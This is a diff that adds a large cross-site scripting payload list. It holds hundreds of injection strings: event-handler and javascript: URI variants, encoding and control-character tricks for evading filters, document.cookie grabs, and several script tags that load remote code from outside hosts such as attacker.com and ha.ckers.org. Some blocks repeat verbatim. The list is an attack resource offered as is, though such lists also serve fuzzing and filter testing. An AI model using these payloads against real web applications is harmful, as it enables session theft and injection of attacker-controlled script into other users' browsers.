@@ -1,0 +1,352 @@
+%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+javascript%3avar%7Ba%3aoerror%7D%3d%7Ba%3aalert%7D%3bthrow%2520document.cookie
+redirect_uri-javascript:alert(%27Xss%20By%20Matrixm%27);
+%3C/%3C/script%3Escript%3E%20%3C%3C/svg%3Esvg/onload=alertxss%3E//
+test+"<%=7*7%>'(</script></style></title></textarea><svg/onload=al\u0065rt'1'>)
+"><img src=xonload=alert(document.cookie)><script>alert(document.cookie)</script>
+d1bvs%3c%2fscript%3e%cscripts3ealert('xss')%3c%2fscript%3ec579g
+1%26jsonp=alert(1337);%23
+&jsonp=alert(1337);#&jsonp=cb12
+</script><body/onload=alert('m3ez')>
+xss"'><iframe srcdoc='%26it;script>;prompt`${document.domain}`%26it;/script'>
+<select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
+test" onmouseover="alert('XSS')
+test"%20onmouseover="alert%26%2300000000000000040;%27XSS%27%26%23000000000041
+test"%20onmouseover="prompt%26%2300000000000000040;%27XSS%27%26%23000000000041
+"<img/src/onerror=alert(0)"@xss.com
+"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
+["');alert('XSS');//"]@xyz.xxx
+<script%20a%20b%20c%20>alert(1)</script%20d%20e%20f>
+<script%20a%20b%20c%20>alert(String.fromCharCode(49))</script%20d%20e%20f>
+<script%20a%20b%20c%20>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script%20d%20e%20f>
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<a href=javas&#99;ript:alert(1)>
+#search=#
+%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b
+Url=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
+Url=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9
+=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+'>"></title></style></textarea></script><script/src=attacker.com/js></script>
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)//
+<script>alert(1)<!–
+<script src=//brutelogic.com.br/1.js>
+<script src=//3334957647/1>
+%3Cx onxxx=alert(1)
+<%78 onxxx=1
+<x %6Fnxxx=1
+<x o%6Exxx=1
+<x on%78xx=1
+<x onxxx%3D1
+<X onxxx=1
+<x OnXxx=1
+<X OnXxx=1
+<x onxxx=1 onxxx=1
+<x/onxxx=1
+<x%09onxxx=1
+<x%0Aonxxx=1
+<x%0Conxxx=1
+<x%0Donxxx=1
+<x%2Fonxxx=1
+<x 1='1'onxxx=1
+<x 1="1"onxxx=1
+<x </onxxx=1
+<x 1=">" onxxx=1
+<http://onxxx%3D1/
+<x onxxx=alert(1) 1='
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+"`'><script>\x0Cjavascript:alert(1)</script>
+"`'><script>\x2Bjavascript:alert(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x0Ajavascript:alert(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+"`'><script>\xC2\x85javascript:alert(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+"`'><script>\x21javascript:alert(1)</script>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\x20javascript:alert(1)</script>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+<script\x2F>javascript:alert(1)</script>
+<script\x20>javascript:alert(1)</script>
+<script\x0D>javascript:alert(1)</script>
+<script\x0A>javascript:alert(1)</script>
+<script\x0C>javascript:alert(1)</script>
+<script\x00>javascript:alert(1)</script>
+<script\x09>javascript:alert(1)</script>
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+<script>javascript:alert(1)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(1)" >
+<input onfocus=javascript:alert(1) autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<video poster=javascript:javascript:alert(1)//
+<img \x00src=x onerror="alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+<img \x12src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x10src=x onerror="javascript:alert(1)">
+<img\x13src=x onerror="javascript:alert(1)">
+<img\x32src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x11src=x onerror="javascript:alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x34src=x onerror="javascript:alert(1)">
+<img \x39src=x onerror="javascript:alert(1)">
+<img \x00src=x onerror="javascript:alert(1)">
+<img src\x09=x onerror="javascript:alert(1)">
+<img src\x10=x onerror="javascript:alert(1)">
+<img src\x13=x onerror="javascript:alert(1)">
+<img src\x32=x onerror="javascript:alert(1)">
+<img src\x12=x onerror="javascript:alert(1)">
+<img src\x11=x onerror="javascript:alert(1)">
+<img src\x00=x onerror="javascript:alert(1)">
+<img src\x47=x onerror="javascript:alert(1)">
+<img src=x\x09onerror="javascript:alert(1)">
+<img src=x\x10onerror="javascript:alert(1)">
+<img src=x\x11onerror="javascript:alert(1)">
+<img src=x\x12onerror="javascript:alert(1)">
+<img src=x\x13onerror="javascript:alert(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<img src=x onerror=\x09"javascript:alert(1)">
+<img src=x onerror=\x10"javascript:alert(1)">
+<img src=x onerror=\x11"javascript:alert(1)">
+<img src=x onerror=\x12"javascript:alert(1)">
+<img src=x onerror=\x32"javascript:alert(1)">
+<img src=x onerror=\x00"javascript:alert(1)">
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+¼script¾alert(¢XSS¢)¼/script¾
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+"`'><script>\x0Cjavascript:alert(1)</script>
+"`'><script>\x2Bjavascript:alert(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x0Ajavascript:alert(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
+"`'><script>\xC2\x85javascript:alert(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+"`'><script>\x21javascript:alert(1)</script>
+"`'><script>\xE2\x80\x82javascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\x20javascript:alert(1)</script>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+<script\x2F>javascript:alert(1)</script>
+<script\x20>javascript:alert(1)</script>
+<script\x0D>javascript:alert(1)</script>
+<script\x0A>javascript:alert(1)</script>
+<script\x0C>javascript:alert(1)</script>
+<script\x00>javascript:alert(1)</script>
+<script\x09>javascript:alert(1)</script>
+"><img src=x onerror=javascript:alert(1)>
+"><img src=x onerror=javascript:alert('1')>
+"><img src=x onerror=javascript:alert("1")>
+"><img src=x onerror=javascript:alert(`1`)>
+"><img src=x onerror=javascript:alert(('1'))>
+"><img src=x onerror=javascript:alert(("1"))>
+"><img src=x onerror=javascript:alert((`1`))>
+"><img src=x onerror=javascript:alert(A)>
+"><img src=x onerror=javascript:alert((A))>
+"><img src=x onerror=javascript:alert(('A'))>
+"><img src=x onerror=javascript:alert('A')>
+"><img src=x onerror=javascript:alert(("A"))>
+"><img src=x onerror=javascript:alert("A")>
+"><img src=x onerror=javascript:alert((`A`))>
+"><img src=x onerror=javascript:alert(`A`)>
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
